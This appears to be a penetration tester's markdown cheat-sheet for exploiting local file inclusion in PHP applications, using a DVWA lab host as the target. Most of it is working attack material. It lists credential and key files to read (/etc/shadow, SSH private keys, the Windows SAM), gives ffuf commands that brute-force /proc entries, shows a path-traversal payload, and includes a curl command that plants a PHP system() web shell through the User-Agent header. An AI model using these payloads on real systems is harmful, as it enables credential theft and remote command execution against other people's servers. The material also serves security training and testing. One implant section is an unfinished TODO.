# Manual

## Enumeration

### Cross Platform

Check for `disable_functions`.

```
phpinfo.php
```

### Linux

```
/etc/group
/etc/shadow
/home/<username>/.ssh/id_rsa
/root/.ssh/id_rsa
/etc/crontab
/home/<username>/.bash_history
/home/<username>/.zsh_history
/home/<username>/.zhistory
```

```
/etc/os-release
```

```
/etc/hosts
/etc/resolv.conf
/proc/net/tcp
/proc/net/udp
/proc/net/arp
/proc/net/dev

/etc/ssh/sshd_config
```

Command line parameters

```
/proc/self/cmdline
/proc/<pid>/cmdline

$ ffuf -u "http://dvwa.local/dvwa/vulnerabilities/fi/?page=FUZZ" -b "PHPSESSID=<PHP_cookie_session_ID>;security=low" -c -w <(for i in $(seq 10000); echo "/proc/$i/cmdline") -mc 200
```

```
/proc/self/environ
/proc/<pid>/environ
```

Current working directory

```
/proc/self/cwd
/proc/<pid>/cwd
```

```
/proc/self/fd/<pid>

$ ffuf -u "http://dvwa.local/dvwa/vulnerabilities/fi/?page=FUZZ" -b "PHPSESSID=<PHP_cookie_session_ID>;security=low" -c -w <(for i in $(seq 10000); echo "/proc/$i/fd") -mc 200
```

```
/proc/self/stat
/proc/self/status
```

```
/proc/mounts
```

### Windows

```
/WINDOWS/repair/sam
/WINDOWS/repair/system
```

## Exploit

### Harvest Credentials

```
../../../../../../../../../../../../windows/system32/config/sam
```

### Spawn Implant

TODO: Upload any file extension to load a php implant

```

```

`/proc/self/environ` contains user inputs that turn it in a useful volatile storage. Apache stores an environment variable for the `HTTP_USER_AGENT` header to be used by the self-contained modules.

```
$ curl "http://dvwa.local/index.php?page=/proc/self/environ&cmd=id" -H "User-Agent" --data "<?php system($_GET['cmd']); ?>"
```

---
## References

- [[File Inclusion Payloads|File Inclusion Payloads]]

- [Hacking Articles: Comprehensive Guide on Local File Inclusion (LFI)](https://www.hackingarticles.in/comprehensive-guide-to-local-file-inclusion/)

- [File Inclusion (Local/Remote)](https://notes.defendergb.org/web-sec/vuln/lfi-rfi)